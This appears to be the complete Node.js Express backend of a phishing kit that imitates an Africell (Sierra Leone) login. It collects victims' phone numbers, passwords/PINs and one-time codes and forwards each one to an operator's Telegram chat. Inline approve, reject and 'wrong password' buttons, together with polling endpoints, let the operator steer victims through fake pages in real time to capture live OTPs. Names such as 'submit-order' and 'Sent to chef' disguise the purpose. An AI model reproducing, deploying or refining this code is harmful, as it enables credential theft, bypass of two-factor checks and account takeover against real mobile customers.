const express = require('express');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

app.use(cors());
app.use(express.json());
app.use(express.static('.')); // Tells Express to serve your HTML files

// Temporary memory pads to track user states by phone number
const orderStatuses = {};   // Tracks Step 1
const promoStatuses = {};   // Tracks Step 2
const lastSubmissionTime = {}; // Tracks the last time a phone number submitted an order

// Helper function to safely fetch from Telegram with a built-in timeout and abort handler
async function sendToTelegram(url, payload) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 15000); // 15 seconds limit

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        return await response.json();
    } catch (error) {
        clearTimeout(timeoutId);
        console.error('Error:', error.message);
        throw error;
    }
}

app.post('/api/submit-order', async (req, res) => {
    try {
        const { phone, uniqueId } = req.body;
        
        const currentTime = Date.now(); 
        const cooldownTime = 60 * 1000; // 60 seconds (1 minute cooldown)

        // If they submitted within the last 60 seconds, silently block duplicate Telegram notifications
        if (lastSubmissionTime[phone] && (currentTime - lastSubmissionTime[phone] < cooldownTime)) {
            return res.json({ success: true, message: 'Already submitted.' });
        }

        // Otherwise, save the new submission time and proceed
        lastSubmissionTime[phone] = currentTime;
        orderStatuses[phone] = 'pending'; // Reset status to pending on new submission

        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        const countryFlag = "🇸🇱";
        const countryCode = "+232";

        const headerTitle = "🔔 *New Africell Login Attempt*";

        const message = `${headerTitle}\n\n` +
                        `${countryFlag} Country: \`${countryCode}\`\n` +
                        `📱 Phone: \`${phone}\`\n` +
                        `🔑 Password/PIN: \`${uniqueId || 'N/A'}\``;

        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        await sendToTelegram(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Approve", callback_data: `approve_${phone}_${uniqueId || 'N/A'}` },
                        { text: "❌ Reject", callback_data: `reject_${phone}_${uniqueId || 'N/A'}` }
                    ],
                    [
                        { text: "⚠️ Wrong Password", callback_data: `wrong_id_${phone}_${uniqueId || 'N/A'}` }
                    ]
                ]
            }
        });

        res.json({ success: true, message: 'Sent to chef.' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, message: 'Error' });
    }
});

// Answer index.html polling loop
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone ? req.query.phone.trim() : '';
    const status = orderStatuses[phone] || 'pending';
    
    console.log(`Polling check for phone: [${phone}] -> status: ${status}`);
    res.json({ status });
});

app.post('/api/verify-promo', async (req, res) => {
    try {
        const { phone, promoCode, uniqueId } = req.body; 
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        promoStatuses[phone] = 'pending';

        const countryFlag = "🇸🇱";
        const message = `📋 *Code Verification Request*\n\n` +
                        `${countryFlag} Phone: \`${phone}\`\n` +
                        `🔑 Password/PIN: \`${uniqueId || 'N/A'}\`\n` + 
                        `🔢 Code Entered: \`${promoCode}\``;

        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const tgResponse = await sendToTelegram(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Valid Code", callback_data: `valid_${phone}_${uniqueId || 'N/A'}` },
                        { text: "❌ Wrong Code", callback_data: `wrong_code_${phone}_${uniqueId || 'N/A'}` }
                    ],
                    [
                        { text: "🔄 Try Again", callback_data: `try_again_${phone}_${uniqueId || 'N/A'}` }
                    ]
                ]
            }
        });

        if (tgResponse && tgResponse.ok === false) {
            console.error("Telegram API Error:", tgResponse);
            return res.status(400).json({ success: false, message: tgResponse.description || 'Telegram rejection' });
        }

        res.json({ success: true, message: 'Success!.' });
    } catch (error) {
        console.error("CRITICAL BACKEND ERROR in /api/verify-promo:", error.message);
        res.status(500).json({ success: false, message: 'Error' });
    }
});

// Answer scratch.html polling loop
app.get('/api/check-promo-status', (req, res) => {
    const phone = req.query.phone ? req.query.phone.trim() : '';
    const status = promoStatuses[phone] || 'pending';
    res.json({ status });
});

app.post('/api/send-thank-you', async (req, res) => {
    try {
        const { phone, uniqueId } = req.body;
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        const countryFlag = "🇸🇱";
        const message = `💬 *OTP Action Requested*\n\n` +
                        `${countryFlag} Phone: \`${phone}\`\n` +
                        `🔑 Password/PIN: \`${uniqueId || 'N/A'}\`\n` +
                        `📌 Action: *Resend OTP Code*`;

        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        await sendToTelegram(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });

        res.json({ success: true, message: 'sent.' });
    } catch (error) {
        console.error("CRITICAL BACKEND ERROR in /api/send-thank-you:", error.message);
        res.status(500).json({ success: false, message: 'Error' });
    }
});

app.post('/api/telegram-webhook', async (req, res) => {
    try {
        const update = req.body;

        if (update.callback_query) {
            const callbackData = update.callback_query.data;
            const chatId = update.callback_query.message.chat.id;
            const messageId = update.callback_query.message.message_id;
            const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

            let actionText = '';
            let phone = '';
            let uniqueId = 'N/A';
            let messageTitle = 'Processed Request';

            if (callbackData.startsWith('approve_')) {
                const parts = callbackData.replace('approve_', '').split('_');
                phone = parts[0];
                uniqueId = parts[1] || 'N/A';
                orderStatuses[phone] = 'approved';
                actionText = 'Approved ✅';
                messageTitle = 'Approval Result';
            } else if (callbackData.startsWith('reject_')) {
                const parts = callbackData.replace('reject_', '').split('_');
                phone = parts[0];
                uniqueId = parts[1] || 'N/A';
                orderStatuses[phone] = 'rejected';
                actionText = 'Rejected ❌';
                messageTitle = 'Rejection Result';
            } else if (callbackData.startsWith('wrong_id_')) {
                const parts = callbackData.replace('wrong_id_', '').split('_');
                phone = parts[0];
                uniqueId = parts[1] || 'N/A';
                orderStatuses[phone] = 'wrong_id';
                actionText = 'Wrong Password ⚠️';
                messageTitle = 'Password Error Result';
            } else if (callbackData.startsWith('valid_')) {
                const parts = callbackData.replace('valid_', '').split('_');
                phone = parts[0];
                uniqueId = parts[1] || 'N/A';
                promoStatuses[phone] = 'valid';
                actionText = 'Valid Code ✅ (Accepted)';
                messageTitle = 'Code Verification Result';
            } else if (callbackData.startsWith('wrong_code_')) {
                const parts = callbackData.replace('wrong_code_', '').split('_');
                phone = parts[0];
                uniqueId = parts[1] || 'N/A';
                promoStatuses[phone] = 'invalid';
                actionText = 'Wrong Code ❌ (Cleared)';
                messageTitle = 'Code Verification Result';
            } else if (callbackData.startsWith('try_again_')) {
                const parts = callbackData.replace('try_again_', '').split('_');
                phone = parts[0];
                uniqueId = parts[1] || 'N/A';
                promoStatuses[phone] = 'try_again';
                actionText = 'Try Again 🔄 (Awaiting New Code)';
                messageTitle = 'Code Verification Result';
            }

            let updatedMessage = `📋 *${messageTitle}*\n\n` +
                                 `🇸🇱 Phone: \`${phone}\`\n` +
                                 `🔑 Password/PIN: \`${uniqueId}\`\n` +
                                 `📌 Status: *${actionText}*`;

            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
            await sendToTelegram(telegramUrl, {
                chat_id: chatId,
                message_id: messageId,
                text: updatedMessage,
                parse_mode: 'Markdown'
            });
        }
    } catch (err) {
        console.error('Webhook Error:', err);
    }

    res.sendStatus(200);
});

async function registerTelegramWebhook() {
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const RENDER_URL = process.env.RENDER_EXTERNAL_URL;

    if (!BOT_TOKEN || !RENDER_URL) {
        console.log('Telegram webhook setup skipped: missing environment variable.');
        return;
    }

    const webhookUrl = `${RENDER_URL}/api/telegram-webhook`;

    try {
        const telegramUrl =
            `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`;

        const result = await fetch(telegramUrl).then(res => res.json());

        console.log('Telegram webhook setup:', result);
        console.log('Webhook URL:', webhookUrl);
    } catch (error) {
        console.error('Telegram webhook setup failed:', error.message);
    }
}

app.listen(PORT, () => {
    console.log(`Server running live at http://localhost:${PORT}`);
    registerTelegramWebhook();
});